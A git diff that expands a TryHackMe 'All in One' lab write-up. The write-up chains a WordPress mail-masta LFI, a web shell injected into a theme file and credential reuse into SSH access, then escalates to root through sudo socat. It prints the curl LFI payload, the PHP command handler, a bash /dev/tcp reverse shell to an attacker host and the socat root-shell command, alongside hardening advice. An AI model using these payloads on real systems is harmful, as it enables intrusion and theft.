@@ -1,181 +1,303 @@
-# All in One  — Technical Report
+# All in One — Technical Report
 
-> Platform: TryHackMe  
-> Difficulty: Easy  
-> Date: 2026-02-20  
-> Author: 0N1S3C  
-> Scope: Authorized TryHackMe lab environment only  
+> **Platform:** TryHackMe \
+> **Difficulty:** `Easy` \
+> **Date:** 2026-02-20 \
+> **Author:** 0N1S3C \
+> **Scope:** Authorized TryHackMe lab environment only 
+
+---
+
+## 0. Executive Summary
+
+The "All in One" machine was found to contain a chain of three critical vulnerabilities spanning web application security and system configuration. An unauthenticated attacker could exploit a Local File Inclusion (LFI) vulnerability in an outdated WordPress plugin to extract database credentials from configuration files. These credentials granted SSH access to the system. A sudo misconfiguration allowing unrestricted execution of `socat` as root enabled immediate privilege escalation to full system compromise. Immediate patching of the vulnerable plugin, removal of credential reuse across services, and auditing of sudo permissions are recommended.
 
 ---
 
 ## 1. Introduction
 
-This report documents the structured assessment and controlled exploitation of the “All in One” machine on TryHackMe.
+This report documents the structured analysis and controlled exploitation of the **"All in One"** machine on TryHackMe.
 
-The objective was to:
+**Objectives:**
+- Obtain user-level access
+- Obtain root/system-level access
 
-Obtain user-level access
-
-Escalate privileges to root
-
-The assessment followed a systematic methodology emphasizing enumeration, credential discovery, and controlled exploitation of misconfigurations.`methodology.md`.
+**Methodology:** Assessments follow the standardized approach defined in `methodology.md`.
 
 ---
 
-## 2. Reconnaissance
+## 2. Attack Chain
 
-### 2.1 Initial Network Scan
+```
+Nmap → WordPress LFI (mail-masta) → wp-config.php credentials → SSH (elyana) → sudo socat → Root
+```
 
-**Command Used:**
+---
+
+## 3. Tools Used
+
+| Tool | Purpose |
+|------|---------|
+| `nmap` | Port scanning & service detection |
+| `gobuster` | Directory enumeration |
+| `wpscan` | WordPress version & plugin enumeration |
+| `curl` | LFI payload delivery via php://filter |
+| `base64` | Decoding extracted configuration file |
+| `find` | File ownership enumeration |
+| `ssh` | Remote access |
+
+---
+
+## 4. Reconnaissance
+
+### 4.1 Initial Network Scan
+
+**Commands:**
 ```bash
 nmap -sC -sV <target-ip>
 ```
 
-**Summary of Findings:**
+**Findings:**
 
 | Port | Service | Version | Notes |
-|------|---------|----------|-------|
-|  21  | FTP | vsftpd 3.0.5 | Anonymous login allowed |
-|  22  | SSH | OpenSSH 8.2p1 | Ubuntu |
-|  80  | HTTP | Apache 2.4.41 | WordPress present |
-Key observations:
-- Anonymous FTP access was permitted but contained no writable or useful files.
-- Web service was running Apache with a WordPress instance located under `/wordpress`.
-- SSH was available, suggesting potential credential-based access.
- 
+|------|---------|---------|-------|
+| 21/tcp | FTP | vsftpd 3.0.5 | Anonymous login allowed (no useful files) |
+| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu | Standard SSH service |
+| 80/tcp | HTTP | Apache 2.4.41 | WordPress installation present |
+
+**Key Observations:**
+- Anonymous FTP access permitted but contained no writable directories or sensitive files
+- Web service running WordPress at `/wordpress` path
+- SSH available for credential-based access post-exploitation
 
 ---
 
-## 3. Service Enumeration
+## 5. Service Enumeration
 
-Each exposed service was analyzed individually to identify potential attack vectors.
+### 5.1 Web Enumeration
 
-### 3.1 Web Enumeration 
+**Tools Used:** `gobuster`, `wpscan`, manual inspection
 
-Tools Used:
-- `gobuster`
-- `wpscan`
-- Manual source code inspection
-Directory enumeration revealed:
-- `/wordpress`
-- `/hackathons`
+**Commands:**
+```bash
+gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
+wpscan --url http://<target-ip>/wordpress --enumerate p
+```
+
+**Findings:**
+
+| Path | Status | Notes |
+|------|--------|-------|
+| `/wordpress` | 200 | WordPress 5.5.1 installation |
+| `/hackathons` | 200 | Static page with HTML comments containing credentials |
+
+**WordPress Configuration:**
+- Version: 5.5.1
+- Plugin identified: **mail-masta** (vulnerable to LFI)
+- XML-RPC enabled
+- Upload directory listing enabled
+
+**Critical Finding in Page Source:**
 The `/hackathons` page contained suspicious HTML comments:
-
-```HTML
+```html
 <!-- Dvc W@iyur@123 -->
 <!-- KeepGoing -->
 ```
 
-### 3.2 Additional Services
-Further enumeration of WordPress identified:
-- WordPress version 5.5.1
-- Plugin: mail-masta
-- XML-RPC enabled
-- Upload directory listing enabled
+These appeared to be credentials but were ultimately a rabbit hole — the actual exploitation path was through the LFI vulnerability.
+
+### 5.2 FTP Service
+
+Anonymous FTP login succeeded but revealed no useful files or writable directories. Not pursued further.
+
 ---
 
-## 4. Initial Access
+## 6. Initial Access
 
-### 4.1 Vulnerability Identification
-The mail-masta plugin was vulnerable to Local File Inclusion (LFI):
-```code
-/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=
+### 6.1 Vulnerability Identification
+
+**Vulnerability:** Local File Inclusion (LFI) in mail-masta WordPress plugin \
+**Location:** `/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=` \
+**Reasoning:** The `pl` parameter was not sanitized and allowed arbitrary file paths to be included. Using PHP filter wrappers (`php://filter/convert.base64-encode/resource=`), the contents of any readable file could be exfiltrated as base64-encoded output.
+
+### 6.2 Exploitation — LFI to Configuration File Disclosure
+
+**Step 1 — Extract wp-config.php:**
+```bash
+curl "http://<target-ip>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php"
 ```
 
-### 4.2 Controlled Exploitation
-Using php://filter encoding, the WordPress configuration file was retrieved:
-``` code
-php://filter/convert.base64-encode/resource=../../../../../wp-config.php
+**Output:** Base64-encoded WordPress configuration file
+
+**Step 2 — Decode:**
+```bash
+echo "<base64_output>" | base64 -d
 ```
-This exposed database credentials:
-- DB_USER: elyana
-- DB_PASSWORD: H@ckme@123
-Administrative access to WordPress was obtained using these credentials.
-To achieve remote command execution, a PHP command handler was injected into the active theme (header.php). This allowed execution via:
-``` code
-/wordpress/?cmd=id
+
+**Credentials recovered:**
+- Database user: `elyana`
+- Database password: `H@ckme@123`
+
+### 6.3 WordPress Admin Access
+
+Using the database credentials at `/wp-admin`, authentication succeeded. To achieve remote command execution, a PHP command handler was injected into the active theme's `header.php` file:
+
+```php
+<?php system($_GET['cmd']); ?>
 ```
-A reverse shell was triggered, resulting in a `www-data` shell.
+
+This allowed arbitrary command execution via:
+```
+http://<target-ip>/wordpress/?cmd=whoami
+```
+
+### 6.4 Reverse Shell
+
+```bash
+# Listener
+nc -lvnp 4444
+
+# Payload via cmd parameter (URL-encoded)
+bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'
+```
+
+**Result:** Reverse shell obtained as `www-data`.
+
 ---
 
-## 5. Lateral Movement
-Enumeration of `/home/elyana`` revealed a hint file:
-``` code
-Elyana's user password is hidden in the system.
+## 7. Lateral Movement
+
+**From:** `www-data` \
+**To:** `elyana`
+
+**Method:**
+
+Enumeration of `/home/elyana` revealed a hint file:
+```bash
+cat /home/elyana/hint.txt
+# "Elyana's user password is hidden in the system."
 ```
-File ownership enumeration was performed:
-``` code
+
+File ownership enumeration was performed to locate files belonging to `elyana`:
+```bash
 find / -user elyana -type f 2>/dev/null
 ```
-This revealed:
-``` code
+
+**Finding:**
+```
 /etc/mysql/conf.d/private.txt
 ```
-Contents:
-``` code
+
+**Contents:**
+```
 user: elyana
 password: E@syR18ght
 ```
-Using these credentials, SSH acess was obtained:
-``` bash
+
+**SSH Access:**
+```bash
 ssh elyana@<target-ip>
-```
-User flag was retrieved from:
-``` bash
-/home/elyana/user.txt
-```
-(Base64 encoded; decoded locally.)
-
-## 6. Privilege Escalation
-### 6.1 Enumeration
-The `id` command revealed:
-``` code
-groups=1000(elyana),4(adm),27(sudo),108(lxd)
+# password: E@syR18ght
 ```
 
-`sudo -l` revealed:
-``` code
-(ALL) NOPASSWD: /usr/bin/socat
-```
-### 6.2 Escalation Vector
-
-The misconfiguration allowing execution of `/usr/bin/socat` as root without a password enabled direct privilege escalation.
-
-Using:
-``` bash 
-sudo socat EXEC:"/bin/bash -li",pty,stderr,setsid,sigint,sane STDIO
-```
-A root shell was obtained.
-
-### 6.3 Result
-Root-level access was achieved. The root flag was retrieved from:
-``` code
-/root/root.txt
-```
-(Base64 encoded; decoded locally.)
+**Result:** Shell obtained as `elyana`. User flag retrieved from `/home/elyana/user.txt` (base64 encoded).
 
 ---
 
-## 7. Defensive Considerations
-### 7.1 Identified Security Weaknesses
-- Vulnerable WordPress plugin (mail-masta LFI)
-- Plaintext credential storage in /etc/mysql/conf.d/private.txt
-- Credential reuse between application and system accounts
-- Misconfigured sudo privileges (NOPASSWD socat)
-- Excessive group membership (lxd group access)
-- Base64 encoding used as flag obfuscation (not secure storage)
+## 8. Privilege Escalation
 
-### 7.2 Hardening Recommendations
-- Remove or update vulnerable plugins
-- Enforce least privilege on system users
-- Avoid credential reuse between services
-- Remove unnecessary sudo privileges
-- Audit group memberships (especially lxd)
-- Secure sensitive configuration files with proper permissions
+### 8.1 Local Enumeration
 
-## 8. Lessons Learned
-- Structured enumeration consistently reveals attack paths.
-- File ownership analysis is highly effective for credential discovery.
-- Local misconfigurations (sudo entries) are often simpler escalation vectors than complex exploits.
-- Multiple escalation paths increase exposure surface area.
-- This assessment demonstrates the importance of defense-in-depth and proper privilege segmentation.
+**Actions Performed:**
+- [x] `id` — confirmed membership in `adm`, `sudo`, and `lxd` groups
+- [x] `sudo -l` — **critical finding**
+
+**Key Findings:**
+```bash
+sudo -l
+# (ALL) NOPASSWD: /usr/bin/socat
+```
+
+`elyana` can execute `/usr/bin/socat` as root with no password required.
+
+### 8.2 Escalation Vector
+
+**Vector:** Unrestricted sudo access to `socat` (GTFOBins) \
+**Root Cause:** The sudo rule grants full execution of `socat`, a networking utility that can spawn interactive shells. No argument restrictions or environment variable limitations were in place.
+
+**Exploitation:**
+```bash
+sudo socat EXEC:"/bin/bash -li",pty,stderr,setsid,sigint,sane STDIO
+```
+
+**Result:** Root shell obtained instantly. Root flag retrieved from `/root/root.txt` (base64 encoded).
+
+---
+
+## 9. Findings Summary
+
+| # | Finding | Severity | Location |
+|---|---------|----------|----------|
+| 1 | LFI in mail-masta WordPress plugin | 🔴 Critical | `/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php` |
+| 2 | Database credentials exposed in WordPress config | 🔴 Critical | `wp-config.php` |
+| 3 | Credential reuse between database and system user | 🔴 Critical | `elyana` account |
+| 4 | Plaintext credentials stored in world-readable config file | 🔴 Critical | `/etc/mysql/conf.d/private.txt` |
+| 5 | Unrestricted sudo access to socat (NOPASSWD) | 🔴 Critical | `/etc/sudoers` |
+| 6 | Excessive group membership (lxd, sudo) | 🟠 High | `elyana` user groups |
+| 7 | Base64 encoding used as flag obfuscation | 🔵 Low | Flag files (not a security control) |
+
+**Severity Scale:**
+`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`
+
+---
+
+## 10. Defensive Considerations
+
+### 10.1 Indicators of Compromise
+
+- Unusual file paths in WordPress plugin requests (`../../../../`, `php://filter`)
+- Large base64-encoded responses in web server access logs
+- PHP theme file modifications (`header.php`, `functions.php`)
+- Outbound connections from `www-data` process to external IPs
+- SSH login as `elyana` from unexpected source IP
+- `sudo socat` execution in auth logs
+- Spawned bash process from `socat` running as root
+
+### 10.2 Security Weaknesses
+
+- Outdated and vulnerable WordPress plugin (mail-masta) installed
+- LFI vulnerability allowing arbitrary file read
+- Database credentials reused for system user authentication
+- Plaintext credentials stored in MySQL configuration directory
+- Sudo misconfiguration granting unrestricted access to powerful networking tool
+- Excessive group memberships (lxd provides alternative root path)
+
+### 10.3 Hardening Recommendations
+
+| Priority | Recommendation | Finding |
+|----------|---------------|---------|
+| Immediate | Remove or update vulnerable mail-masta plugin to patched version | Finding 1 |
+| Immediate | Rotate `elyana` database and SSH passwords to unique values | Finding 3 |
+| Immediate | Remove or restrict sudo socat rule — apply least privilege | Finding 5 |
+| Immediate | Restrict `/etc/mysql/conf.d/private.txt` to root-only read permissions | Finding 4 |
+| Short-term | Enforce unique passwords across all services and applications | Finding 3 |
+| Short-term | Audit all user group memberships — remove unnecessary privileges | Finding 6 |
+| Short-term | Implement file integrity monitoring on WordPress installation | Finding 1 |
+| Long-term | Regular WordPress plugin audits and automated update enforcement | Finding 1 |
+| Long-term | Deploy Web Application Firewall (WAF) to detect LFI patterns | Finding 1 |
+
+---
+
+## 11. Lessons Learned
+
+- **Structured enumeration reveals hidden credentials** — file ownership analysis (`find / -user <username>`) is highly effective for discovering misplaced credential files. This technique should be a standard post-access enumeration step.
+- **WordPress plugins are high-value targets** — outdated or abandoned plugins like mail-masta remain common in real environments. Always enumerate installed plugins and check for known CVEs.
+- **Credential reuse multiplies impact** — one set of database credentials unlocked SSH access. Enforcing unique passwords across services is critical defense-in-depth.
+- **GTFOBins is essential knowledge** — recognizing that `sudo socat` = instant root shell is a core red team skill. Any sudo rule granting access to networking tools, scripting interpreters, or file manipulation utilities should be treated as potential privilege escalation.
+- **Multiple escalation paths increase exposure** — this box had at least three potential privesc vectors: sudo socat, lxd group membership, and credential reuse. Defenders must address all paths, not just the most obvious.
+- **HTML comments are often red herrings** — the credentials in the `/hackathons` page source looked promising but were ultimately a distraction. Real exploitation required following the LFI → config extraction path.
+
+---
+
+*End of Report*
+*Classification: Public — flags and sensitive values omitted*
